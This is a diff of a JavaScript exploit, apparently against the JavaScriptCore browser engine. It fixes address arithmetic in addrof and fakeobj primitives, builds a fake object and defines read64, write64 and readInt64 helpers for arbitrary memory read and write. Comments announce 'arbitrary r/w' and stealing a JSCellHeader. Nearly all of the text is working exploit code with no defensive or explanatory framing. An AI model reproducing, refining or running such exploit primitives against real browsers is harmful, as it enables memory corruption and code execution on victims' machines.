@@ -481,7 +481,7 @@ for (var i = 0; i < 1000; ++i) {
           return new Int64.fromDouble(a1[offset]);
         }
         fakeobj = (addr) => {
-          a1[offset] = qwordAsFloat(addr);
+          a1[offset] = addr;
           return new Int64(b1[0]).asDouble();
         }
         var victim1 = structure_spray[510];
@@ -502,9 +502,9 @@ for (var i = 0; i < 1000; ++i) {
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
-    print("outer @ " + hex1(addrof(container)));
+    print("outer @ " + addrof(container));
 
-    var hax = fakeobj(addrof(container) + 0x10);
+    var hax = fakeobj(Add(addrof(container),0x10));
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
@@ -535,7 +535,7 @@ for (var i = 0; i < 1000; ++i) {
         },
 
         write64: function(where, what) {
-            hax[1] = new Int64(where + 0x10).asDouble();
+            hax[1] = new Int64(Add(where ,0x10)).asDouble();
             victim1.prop = this.fakeobj(new Int64(what).asDouble());
         },
 
@@ -545,7 +545,7 @@ for (var i = 0; i < 1000; ++i) {
                 offset *= 8
                 return this.read64(where+offset);
             }
-            hax[1] = new Int64(where + 0x10).asDouble();
+            hax[1] = new Int64(Add(where,0x10)).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -553,7 +553,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         readInt64: function(where) {
             //var reset = hax[1];
-            hax[1] = new Int64(where + 0x10).asDouble();
+            hax[1] = new Int64(Add(where,0x10)).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
